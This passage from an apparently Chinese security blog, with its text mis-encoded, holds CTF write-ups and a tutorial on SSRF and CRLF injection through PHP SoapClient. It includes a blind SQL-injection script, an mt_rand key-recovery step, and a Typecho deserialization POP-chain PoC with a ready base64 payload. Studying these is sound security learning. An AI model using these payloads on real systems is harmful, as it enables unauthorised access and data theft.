12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123; $username = $_POST['username']; $password = $_POST['password']; $Private_key = $_POST['Private_key']; if (($username == '') || ($password == '') ||($Private_key == '')) &#123; // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢ header('refresh:2; url=login.html'); echo \"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\"; exit;&#125; else if($Private_key != '*************' ) &#123; header('refresh:2; url=login.html'); echo \"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\"; exit; &#125; else&#123; if($Private_key === '************')&#123; $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; $link=mysql_connect(\"localhost\",\"root\",\"root\"); mysql_select_db(\"test\",$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo \"&lt;tr&gt;&lt;td&gt;\".$row[\"username\"].\"&lt;/td&gt;&lt;td&gt;\".$row[\"flag\"].\"&lt;/td&gt;&lt;td&gt;\"; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key??? åªè¦ç»•è¿‡ä¸€ä¸ªç§é’¥å³å¯sqlæ³¨å…¥ã€‚é‚£ä¹ˆæ³¨æ„åˆ°å…¬,ç§é’¥æ˜¯é€šè¿‡mt_rand()ç”Ÿæˆçš„ï¼Œé‚£å°±å¥½è¯´ã€‚ç›´æ¥./mt_rèµ°èµ·å…ˆå°†å…¬é’¥è½¬ä¸ºè„šæœ¬å¯è¯†åˆ«çš„æ•°æ® 1234567891011str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'str2='KVQP0LdJKRaV3n9D'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res) ç„¶åè®¾å®šå¥½éšæœºæ•°ç§å­ï¼ŒæŒ‰å…ˆå…¬é’¥,å†ç§é’¥çš„é¡ºåºç”Ÿæˆã€‚å¾—åˆ°ç§é’¥XuNhoueCDCGcç›´æ¥sqlæ³¨å…¥å³å¯ 1234567891011121314151617181920import requestsurl='http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php'flag=''for i in range(1,50): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-\": payload = \"1' or if(ascii(substr(flag,\"+str(i)+\",1))=\"+str(ord(str1))+\",sleep(3),1)#\" data = &#123; 'username': 'admin', 'password': payload, 'Private_key': 'XuNhoueCDCGc', 'login': '1' &#125; try: r = requests.post(url, data=data,timeout=3) except requests.exceptions.ReadTimeout: flag += str1 print(flag) break æ‰“å¼€kali+çˆ†ç ´ç§å­èŠ±äº†10å¤šåˆ†é’Ÿï¼Œå‰å‡ è¡€åˆæ²¡äº†ã€‚å¿ƒé‡Œè‹¦ã€‚äº‹åä»”ç»†ä¸€çœ‹sqlè¯­å¥å·²ç»å†™å¥½äº†ï¼Œæ‰€ä»¥åªè¦ä¸‡èƒ½å¯†ç å°±è¡Œäº†ã€‚éš¾æ€ªæ‰‹é€Ÿæ…¢ï¼Œè¯¥æ‰“ã€‚ Ezpop_revengeæ‰“ç®—å†™wpå°±æ˜¯ä¸ºäº†è¿™é¢˜ã€‚è´¨é‡ç»å¯¹å¤Ÿã€‚å¼€å§‹ä¸‹è½½www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚è·Ÿzjyå¸ˆå‚…å®¡å‡ºäº†å…¥å£+åˆ©ç”¨ç‚¹å°±æ‡’å¾—å†™pocäº†ã€‚ä¸è¿‡è¿˜æ˜¯å¾—åŠ¨æ‰‹åšåšæ‰è¡Œã€‚ï¼ˆæ¯•ç«Ÿå®é™…å†™èµ·æ¥å¤šåŠç›´æ¥æ‹‰èƒ¯ï¼‰ é¦–å…ˆæ˜¯ç»ˆç»“ç‚¹ 1234567&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\")&#123; $_SESSION['flag']= \"MRCTF&#123;******&#125;\";&#125;else echo \"æˆ‘æ‰Œyour problem?\\nonly localhost can get flag!\";?&gt; æ˜¾ç„¶æ˜¯è¦ssrfã€‚è€Œä¸”è¿™é‡Œè®©æˆ‘è«åæƒ³åˆ°äº†ä¹‹å‰LCTFçš„bestphpâ€™srevenge.å°±æ˜¯é€šè¿‡Soapæ‰“ssrfçš„ä¸€ä¸ªtrick.ç„¶åæ‰¾å…¥å£äº†ã€‚è¿™é‡Œéš¾å—çš„æ˜¯phpstormå…¨å±€æœç´¢æ‰¾ä¸åˆ°unserializeã€‚è¿˜æ˜¯zjyå¸ˆå‚…å¸®æˆ‘æ‰¾åˆ°çš„.åŸæ¥æ˜¯æ’ä»¶é‡Œé¢æ‰‹å†™çš„ä¸€ä¸ªç±»ä¸»ä½“å‡½æ•°å¤§æ¦‚è¿™ä¹ˆå¤š 12345678910111213141516171819class HelloWorld_DB&#123; private $flag=\"MRCTF&#123;this_is_a_fake_flag&#125;\"; private $coincidence; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); &#125;&#125;public function action()&#123; if(!isset($_SESSION)) session_start(); if(isset($_REQUEST['admin'])) var_dump($_SESSION); if (isset($_POST['C0incid3nc3'])) &#123; if(preg_match(\"/file|assert|eval|[`\\'~^?&lt;&gt;$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else &#123; echo \"Not that easy.\"; &#125; &#125; &#125; æ³¨æ„åˆ°wakeupåè‡ªç„¶æ˜ç™½ååºåˆ—åŒ–çš„è§¦å‘æ–¹å¼äº†.åŒæ—¶æŒ‰ç…§LCTFçš„ç»éªŒï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªä¸€ä¸ªåŒå‚æ•°å‡½æ•°ï¼Œå³call_user_func+Soapæ‰“ssrfã€‚è·Ÿä¸€ä¸‹Typecho_Dbç±» æœä¸å…¶ç„¶æœ‰ä¸ªcall_user_funcã€‚è€Œä¸”å‚æ•°éƒ½å¯æ§ï¼Œé“¾å­ç»“æŸã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸ªåŸé¢˜é­”æ”¹äº†ä¸‹ã€‚å½“æ—¶çœ‹åˆ°è¿™å°±æ²¡åšäº†ã€‚ ç„¶è€Œäº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ã€‚åæ¥å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚é‚£å°±æ˜¯LCTFå¯ä»¥åˆ©ç”¨sessionå¤„ç†å™¨å°†Soapçš„åºåˆ—åŒ–æ•°æ®å†™åˆ°sessioné‡Œï¼Œç„¶åcall_user_funcè§¦å‘ã€‚è¿™é‡Œå´ä¸è¡Œã€‚é‚£å°±éœ€è¦æŠŠé“¾å­å†å¤šæŒ–ä¸€ä¸‹. æ³¨æ„åˆ°ä¹‹å‰çš„ç»“å°¾æç¤ºæˆ‘ä»¬__toString()ã€‚å…¨å±€æœç´¢ä¸‹toStringï¼Œè·Ÿåˆ°\\var\\Typecho\\Db\\Query.phpä¸‹ã€‚æ³¨æ„åˆ°è¿™é‡Œï¼Œ$this-&gt;_sqlPreBuild[&#39;action&#39;]æ—¶æ‰§è¡Œäº†_adapterçš„parseSelect()æ–¹æ³•ã€‚åº”è¯¥å¯ä»¥æ»¡è¶³æˆ‘ä»¬è§¦å‘Soapçš„æ¡ä»¶ï¼Œå³è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•ã€‚æ¢³ç†å®Œé‡ç‚¹åå¼€å§‹æ„é€ äº†ã€‚ 1234$db &#x3D; new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);&#x3D;&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;)) &#x3D;&gt; __toString()&#x2F;&#x2F;Typecho_Db_Query &#x3D;&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild) åªç”¨åˆ°ä¸¤ä¸ªç±»,popé“¾ä¸é•¿ï¼ˆhhhï¼‰poc 123456789101112131415161718192021222324252627class Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; $target = \"http://127.0.0.1/flag.php\"; $headers = array( 'X-Forwarded-For:127.0.0.1', \"Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0\" ); $this-&gt;_adapter = new SoapClient(null, array('uri' =&gt; 'abc', 'location' =&gt; $target, 'user_agent' =&gt; 'byc404^^' . join('^^', $headers))); $this-&gt;_sqlPreBuild = ['action' =&gt; \"SELECT\"]; &#125;&#125;class HelloWorld_DB&#123; private $coincidence; public function __construct() &#123; $this-&gt;coincidence = array(\"hello\" =&gt; new Typecho_Db_Query()); &#125;&#125;$poc = serialize(new HelloWorld_DB());$poc = preg_replace(\" /\\^\\^/\", \"\\r\\n\", $poc);echo base64_encode($poc); ç„¶åè§¦å‘çš„åœ°æ–¹æ²¡æ‰¾åˆ°â€¦â€¦åŸæ¥åœ¨/var/Typeecho/Plugin.phpé‡Œ 123456public static function activate($pluginName)&#123; self::$_plugins['activated'][$pluginName] = self::$_tmp; self::$_tmp = array(); Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action');&#125; é‚£ä¹ˆå°±å°è¯•æäº¤pocã€‚ 1post: C0incid3nc3&#x3D;TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ&#x3D;&#x3D; ç„¶å?admin=1è®¿é—®å³å¯ã€‚ç„¶ååº”è¯¥æ˜¯è·ŸLCTFä¸€æ ·ï¼Œæœ€å¥½payloadè·Ÿæ£€æŸ¥flagçš„PHPSESSIDä¸è¦ç”¨åŒä¸€ä¸ªã€‚æˆ‘çœ‹Nepnepå¸ˆå‚…ä»¬çš„wpé‡Œè¯´ç›´æ¥ç”Ÿæˆçš„payloadè¿‡ä¸å»ã€‚æˆ‘åæ­£??????äººå®¶ç‰¹æ„è®¾å®šçš„base64encodeæ ¹æœ¬ä¸å­˜åœ¨privateç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜å•Šã€‚åæ­£æˆ‘æ˜¯å¯ä»¥ç›´æ¥æ‰“çš„,åº”è¯¥æ²¡å•¥é—®é¢˜ã€‚ å¤§æ¦‚è¿™ä¹ˆå¤šï¼Œé¢˜ç›®æ¯•ç«Ÿæ–°æ‰‹é¢˜ã€‚æ”¶è·è°ˆä¸ä¸Šï¼Œæ²¡æ‰é“¾å­å°±ç®—æ»¡æ„äº†ã€‚æœ€åä¸€é¢˜ä¹Ÿæé†’äº†è‡ªå·±æ‹’ç»æƒ³å½“ç„¶ï¼Œé“¾å­æ²¡å†™å‡ºæ¥å°±ä¸èƒ½ç©ºæƒ³ï¼Œå®åœ¨çš„pocæ‰æ˜¯ç‹é“ã€‚è¿‡å‡ å¤©æŠŠå¹½çµçŒ«çš„æ€»ç»“ä¸‹ã€‚æ¯•ç«Ÿå›½é™…èµ›ä¸Šä¹Ÿé‡åˆ°äº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"ä½¿ç”¨Soapçš„ssrf/crlfæ”»å‡»","slug":"ä½¿ç”¨Soapçš„ssrf-crlfæ”»å‡»","date":"2020-03-18T14:51:34.000Z","updated":"2021-02-18T05:08:38.115Z","comments":true,"path":"2020/03/18/ä½¿ç”¨Soapçš„ssrf-crlfæ”»å‡»/","link":"","permalink":"https://www.bycsec.top/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/","excerpt":"è¿™å‡ å¤©åœ¨buuä¸Šç–¯ç‹‚åˆ·é¢˜ã€‚çªç„¶æ¥è§¦åˆ°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹ã€‚é‚£å°±æ˜¯ä½¿ç”¨Soapè¿›è¡Œssrfã€‚ç›®å‰åšåˆ°çš„å‡ é“é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯éå¸¸æœ‰è¥å…»çš„ã€‚é‚£ä¹ˆå¹²è„†æ€»ç»“ä¸‹å…³äºphp+Soapçš„ç›¸å…³çŸ¥è¯†ã€‚","text":"è¿™å‡ å¤©åœ¨buuä¸Šç–¯ç‹‚åˆ·é¢˜ã€‚çªç„¶æ¥è§¦åˆ°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹ã€‚é‚£å°±æ˜¯ä½¿ç”¨Soapè¿›è¡Œssrfã€‚ç›®å‰åšåˆ°çš„å‡ é“é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯éå¸¸æœ‰è¥å…»çš„ã€‚é‚£ä¹ˆå¹²è„†æ€»ç»“ä¸‹å…³äºphp+Soapçš„ç›¸å…³çŸ¥è¯†ã€‚ SoapSOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDLã€UDDIï¼‰ä¹‹ä¸€ï¼š WSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚ UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webServiceã€‚ SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚ SoapClientPHP çš„ SOAP æ‰©å±•å¯ä»¥ç”¨æ¥æä¾›å’Œä½¿ç”¨ Web Servicesè¿™ä¸ªæ‰©å±•å®ç°äº†6ä¸ªç±»ã€‚å…¶ä¸­æœ‰ä¸‰ä¸ªé«˜çº§çš„ç±»ï¼š SoapClientã€SoapServer å’ŒSoapFaultï¼Œå’Œä¸‰ä¸ªä½çº§ç±»ï¼Œå®ƒä»¬æ˜¯ SoapHeaderã€SoapParam å’Œ SoapVarã€‚å…¶æ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š 1public SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œarray $options ]ï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚é€šå¸¸æˆ‘ä»¬æ„é€ æ—¶è®¾ä¸ºnullå³å¯ã€‚ ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ è¿™é‡Œæœ‰è¶£çš„åœ°æ–¹å°±åœ¨äºä¸¤ç‚¹ SoapClientæ˜¯phpçš„åŸç”Ÿç±»ã€‚ä¸”å®ƒæœ‰ä¸€ä¸ª__call()é­”æœ¯æ–¹æ³• SoapClientçš„ç¬¬äºŒä¸ªå‚æ•°å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰User-Agent æ¥ä¾æ¬¡è§£é‡Šä¸‹è¿™ä¸¤ä¸ªæœ‰è¶£ä¹‹å¤„1.åŸç”Ÿç±»è¯´æ˜æˆ‘ä»¬ä¸éœ€è¦åˆ»æ„å»å¯»æ‰¾php POPChainä¸­çš„åˆ©ç”¨ç‚¹ã€‚å› ä¸ºSoapå·²ç»æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªç°æˆçš„é­”æœ¯æ–¹æ³•ã€‚è€Œåªè¦ç”¨Soap,æˆ‘ä»¬å°±å¯ä»¥è¾¾æˆssrfï¼Œå¯ä»¥æ‰“å†…ç½‘. 2.User-Agentå¯è‡ªå®šä¹‰å¸¦æ¥çš„æ˜¯CRLFæ³¨å…¥çš„å¯èƒ½ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå› ä¸ºhttp headeré‡Œæœ‰ä¸€ä¸ªé‡è¦çš„Content-Typeä¸ºå’ŒContent-Lengthã€‚è€ŒUser-Agentçš„http headerä½ç½®æ­£å¥½åœ¨è¿™äº›ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–ã€‚å¯¹äºContent-Typeï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ©ç”¨CRLFå‘é€postè¯·æ±‚ï¼Œé‚£ä¹ˆè¦æ±‚å®ƒä¸ºapplication/x-www-form-urlencodeé‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨CRLFï¼Œæ„é€ å¦‚ä¸‹payload 12345$payload &#x3D; new SoapClient(null,array(&#39;user_agent&#39;&#x3D;&gt;&quot;test\\r\\nCookie: PHPSESSID&#x3D;08jl0ttu86a5jgda8cnhjtvq32\\r\\nContent-Type: application&#x2F;x-www-form-urlencoded\\r\\nContent-Length:45\\r\\n\\r\\nusername&#x3D;admin&amp;password&#x3D;nu1ladmin&amp;code&#x3D;470837\\r\\n\\r\\n\\r\\n&quot;,&#39;location&#39;&#x3D;&gt;$location,&#39;uri&#39;&#x3D;&gt;$uri)); CRLFä¸SSRFï¼Œè¿™ä¸¤ä¸ªæ¼æ´éƒ½å¯ä»¥é€šè¿‡SoapClientè¾¾æˆã€‚ çœŸé¢˜å¹²è¯´é“ç†æ˜¯ä¸å¤Ÿçš„ï¼Œè¿™é‡Œç›´æ¥æŠŠå‡ å¤©æ¥åšåˆ°çš„çœŸé¢˜åˆ†æä¸‹ã€‚ è¸©å‘ï¼š windowsä¸‹å¼€å¯SoapClient:SoapClientç”¨åˆ°çš„æ˜¯phpæ‰©å±•ï¼Œéœ€è¦åœ¨php.iniå¯ç”¨ä¸‰ä¸ªåŠ¨æ€é“¾æ¥åº“ php_soap.dll php_openssl.dll php_curl.dll è¿™é‡Œæˆ‘çš„iniæ–‡æœ¬ä¸­å¼€å§‹åªæ‰¾åˆ°ä¸€ä¸ªæœªå¯ç”¨çš„åº“;extension=php_curl.dllï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨phpçš„æ–‡ä»¶å¤¹çš„exté‡Œåº”è¯¥æ˜¯å¯ä»¥å…¨éƒ¨æ‰¾åˆ°çš„ã€‚æ‰€ä»¥éœ€è¦æŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶åéƒ½å¯ç”¨ï¼ˆå³å»æ‰å¼€å¤´åˆ†å·ï¼‰ï¼Œå¹¶ä»¤å…¶ç­‰äºå¯¹åº”çš„æ‰©å±•è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨SoapClientäº†ã€‚ Linuxå®‰è£…ä¸€æŠŠæ¢­å°±å¥½ï¼Œä¸å¿…å¤šè¯´ã€‚ bestphpâ€™s revengeé¢˜ç›®æºç index.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; flag.php 123456session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123; $_SESSION['flag'] = $flag; &#125; é¢˜ç›®æœ‰å‡ ä¸ªé‡ç‚¹ï¼Œæˆ‘ä»¬å…ˆä»ç»“æœçœ‹èµ·ã€‚flagåœ¨flag.phpä¸­ï¼Œæƒ³è¦è¯»åˆ°flagï¼Œå¿…ç„¶éœ€è¦ä»127.0.0.1è®¿é—®ï¼Œç„¶åflagä¼šè¢«ä¿å­˜åœ¨sessionå€¼ä¸­ã€‚æ˜¾ç„¶æ˜¯ä¸ªssrfäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹index.phpä¸­çš„ä»£ç var_dump($_SESSION);é¦–å…ˆç¡®è®¤sessionçš„å€¼ä¼šè¢«æ‰“å°å‡ºæ¥ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£çœ‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ssrfäº†ã€‚å†æ¥çœ‹çœ‹å…¶ä»–å‡½æ•°éœ€è¦æ€ä¹ˆåˆ©ç”¨ã€‚å¾ˆå”çªçš„ä¸€ä¸ª$b = &#39;implode&#39;;+call_user_func($_GET[&#39;f&#39;], $_POST);ä»¥åŠæœ€åä¸€ä¸ªcall_user_func($b, $a);è¿™é‡Œbç´§æ¥ç€ä¸€ä¸ªcall_user_funcçœ‹æ¥æ˜¯å¯ä»¥å˜é‡è¦†ç›–äº†ã€‚é‚£ä¹ˆå¦‚æœè¦†ç›–äº†çš„è¯ï¼Œè¦†ç›–æˆä»€ä¹ˆï¼Œåˆæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œéœ€è¦çŸ¥é“ä¸€ç‚¹ï¼š call_user_func()å‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯arrayç±»å‹çš„è¯ï¼Œä¼šå°†æ•°ç»„çš„æˆå‘˜å½“åšç±»åå’Œæ–¹æ³• â€˜å‡å¦‚æˆ‘ä»¬ä¸€å¼€å§‹åˆ©ç”¨få°†bè¦†ç›–æˆ call_user_func()ï¼Œé‚£ä¹ˆåœ¨index.phpçš„æœ€åï¼Œå‡½æ•°å°†æ‰§è¡Œcalluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™))ç”±äº$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];å¯æ§ï¼Œå¦‚æœä»¤name=SoapClientï¼Œä¸å°±æˆäº† 1call_user_func(SoapClient-&gt;welcome_to_the_lctf2018) å—ï¼Ÿå‰é¢æåˆ°ï¼Œå¦‚æœSoapClientå­˜åœ¨__call()é­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•å°†ç›´æ¥è§¦å‘æˆ‘ä»¬æ‰€éœ€è¦çš„ssrf.é‚£ä¹ˆæ•´ä¸ªæµç¨‹çš„æœ€åä¸€æ­¥å¯ä»¥å…ˆè¡Œæ„é€ ï¼š 12345678&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"byc\\r\\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\\r\\n\", 'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload;?&gt; æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¿˜ç”¨åˆ°äº†æˆ‘ä»¬ä¸Šé¢æåˆ°çš„CRLFæ¼æ´ 1&#39;user_agent&#39; &#x3D;&gt; &quot;byc\\r\\nCookie: PHPSESSID&#x3D;g6ooseaeo905j0q4b9qqn2n471\\r\\n&quot;, çœ‹ï¼Œåªè¦\\r\\nï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è®¿é—®æ—¶çš„Cookie,è¿™æ ·æœ€åç”Ÿæ•ˆçš„flagä¹Ÿä¼šè¢«ä¿å­˜åœ¨æˆ‘ä»¬å¯æ§çš„cookieä¸­ ä¸‹é¢è¦æ€è€ƒçš„å°±æ˜¯ï¼Œæ€ä¹ˆè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Ÿè”ç³»åˆ°é¢˜ç›®ä¸­æ•æ„Ÿçš„sessionå­˜å‚¨ï¼Œè‡ªç„¶å¯ä»¥è”æƒ³åˆ°æŸä¸ªä¸ç”¨unserializeä¹Ÿèƒ½è§¦å‘çš„ååºåˆ—åŒ–æ¼æ´ï¼šphpsessionå¤„ç†å™¨å¼•æ“ä¸ä¸€è‡´å¯¼è‡´çš„ååºåˆ—åŒ–ã€‚é‚£ä¹ˆé—®é¢˜å°±è§£å†³äº†ï¼šæˆ‘ä»¬åœ¨æœ€å¼€å§‹å°±ä»¤å¼•æ“ä¸ºphp_serializeï¼Œå¹¶å°†åºåˆ—åŒ–æ•°æ®å­˜å‚¨åˆ°sessionä¸­ã€‚ç„¶ååœ¨ç¬¬äºŒæ¬¡æ‰è¿›è¡Œssrfã€‚æ­¤æ—¶ç”±äºå¤„ç†å™¨é‡æ–°å˜å›phpï¼Œå°†è§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘ssrfï¼Œå°†flagå­˜å‚¨åœ¨å¯æ§cookieä¸­ã€‚æœ€åæ¢cookieè®¿é—®å³å¯ã€‚pocï¼š 123456781.f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5......åŒæ—¶post serizliaze_handler&#x3D;php_serializeè¿™æ ·æ‰§è¡Œçš„å°±æ˜¯session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)æˆ‘ä»¬çš„æ•°æ®è¢«æˆåŠŸå†™å…¥session2.f&#x3D;extract&amp;name&#x3D;SoapClientåŒæ—¶post b&#x3D;calluserfuncè¿™æ ·æ‰§è¡Œçš„å°±æ˜¯calluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™)) æœ€åæ¢cookieè®¿é—®index.phpå°±èƒ½æ‹¿åˆ°flagäº†ã€‚ De1CTF shellshellshellè¶…çº§éº»çƒ¦çš„ä¸€é“é¢˜â€¦â€¦å¯èƒ½æ˜¯å› ä¸ºæˆ‘æ‡’å¾—å†™è‡ªåŠ¨åŒ–è„šæœ¬å§ã€‚çœ‹åˆ°èµµå¸ˆå‚…çš„wpç›´æ¥è‡ªåŠ¨åŒ–ä¸€æŠŠæ¢­ç¾¡æ…•ä¸å·²ã€‚è¿™é¢˜å…¶ä»–ç»†èŠ‚æˆ‘å°±ä¸è®²äº†ï¼Œä¸»è¦é‡ç‚¹è®²è®²ä¸­é—´åˆ©ç”¨Soapçš„éƒ¨åˆ†é¦–å…ˆé¢˜ç›®åœ¨ç™»å½•è¿›å»åæœ‰ä¸ªç‚¹ï¼Œè¿™é‡Œsignatureå˜é‡å¯ä»¥æ„é€ ä¸‹æ—¶é—´ç›²æ³¨ã€‚å› 